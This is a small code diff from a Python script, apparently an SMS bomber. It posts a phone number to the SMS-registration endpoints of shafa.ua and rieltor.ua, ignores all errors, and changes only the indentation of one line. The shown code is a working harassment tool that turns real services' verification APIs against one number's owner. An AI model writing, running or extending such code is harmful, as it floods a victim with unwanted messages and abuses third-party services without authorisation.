@@ -509,7 +509,7 @@ def main(t):
       try:
         requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"})
       except:
-	pass
+        pass
       try:
         requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0})
       except:
